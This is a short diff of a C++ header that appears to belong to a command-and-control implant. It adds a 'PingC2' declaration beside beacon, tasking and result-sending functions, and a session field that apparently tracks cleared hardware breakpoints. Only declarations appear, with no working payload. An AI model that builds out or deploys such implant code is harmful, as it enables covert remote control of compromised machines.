@@ -16,6 +16,7 @@ struct Session {
     BOOL  hwbpsCleared;
 };
 
+BOOL  PingC2();
 DWORD BeaconLoop(const Session& session);
 BOOL SendBeacon(const Session& session, std::wstring& taskOut);
 BOOL SendResult(const std::wstring& sessionId, const std::wstring& output);
